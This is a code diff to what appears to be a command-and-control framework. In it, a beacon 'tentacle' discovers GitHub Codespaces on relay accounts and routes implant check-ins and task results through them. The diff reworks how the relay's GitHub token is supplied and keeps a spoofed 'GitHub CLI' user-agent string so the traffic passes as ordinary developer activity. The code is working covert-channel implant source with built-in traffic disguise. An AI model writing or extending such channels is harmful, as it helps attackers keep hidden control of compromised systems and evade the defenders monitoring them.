@@ -6,13 +6,20 @@
  * for each relay, and proxies checkin/submitResult through the first
  * working relay. Caches the active relay for the session lifetime.
  *
- * Each relay entry has an account, repo, and optional token. The tentacle
- * uses GrpcSshTentacle internally, setting the necessary env vars before
- * each connection attempt and restoring them afterward (safe in Bun's
- * single-threaded runtime).
+ * Each relay entry contains only non-secret account/repository coordinates.
+ * Codespaces discovery and SSH use the dedicated runtime-only
+ * SVC_CODESPACES_GITHUB_TOKEN; repository App leases are never reused.
  */
 
-import type { CheckinPayload, Task, TaskResult, BeaconConfig, ITentacle, RelayConfig } from "../types.ts";
+import type {
+  CheckinPayload,
+  Task,
+  TaskResult,
+  BeaconConfig,
+  ITentacle,
+  RelayConfig,
+  ResultSubmissionOutcome,
+} from "../types.ts";
 import { GrpcSshTentacle } from "./GrpcSshTentacle.ts";
 import { Octokit } from "@octokit/rest";
 import { createLogger } from "../logger.ts";
@@ -27,7 +34,8 @@ export class RelayConsortiumTentacle implements ITentacle {
   constructor(private readonly config: BeaconConfig) {}
 
   async isAvailable(): Promise<boolean> {
-    return (this.config.relayConsortium?.length ?? 0) > 0;
+    return (this.config.relayConsortium?.length ?? 0) > 0 &&
+      Boolean(process.env["SVC_CODESPACES_GITHUB_TOKEN"]?.trim());
   }
 
   /**
@@ -43,7 +51,7 @@ export class RelayConsortiumTentacle implements ITentacle {
    */
   protected async discoverCodespace(relay: RelayConfig): Promise<string | null> {
     try {
-      const token = relay.token ?? this.config.token;
+      const token = this.codespacesGitHubToken();
       const octokit = new Octokit({ auth: token, userAgent: process.env.OCTOC2_USER_AGENT ?? "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0" });
       const resp = await octokit.rest.codespaces.listInRepositoryForAuthenticatedUser({
         owner: relay.account,
@@ -85,7 +93,6 @@ export class RelayConsortiumTentacle implements ITentacle {
 
       const relayBeaconConfig: BeaconConfig = {
         ...this.config,
-        token: relay.token ?? this.config.token,
         repo: { owner: relay.account, name: relay.repo },
       };
 
@@ -117,11 +124,15 @@ export class RelayConsortiumTentacle implements ITentacle {
     return [];
   }
 
-  async submitResult(result: TaskResult): Promise<void> {
+  async submitResult(result: TaskResult): Promise<ResultSubmissionOutcome> {
     if (!this.activeRelay) {
       throw new Error("RelayConsortiumTentacle: no active relay for submitResult");
     }
-    await this.activeRelay.submitResult(result);
+    const outcome = await this.activeRelay.submitResult(result);
+    return {
+      ...outcome,
+      channel: "relay",
+    };
   }
 
   async teardown(): Promise<void> {
@@ -129,5 +140,15 @@ export class RelayConsortiumTentacle implements ITentacle {
       await this.activeRelay.teardown().catch(() => {});
       this.activeRelay = null;
     }
+  }
+
+  private codespacesGitHubToken(): string {
+    const token = process.env["SVC_CODESPACES_GITHUB_TOKEN"]?.trim();
+    if (!token) {
+      throw new Error(
+        "SVC_CODESPACES_GITHUB_TOKEN is required for relay Codespaces discovery",
+      );
+    }
+    return token;
   }
 }
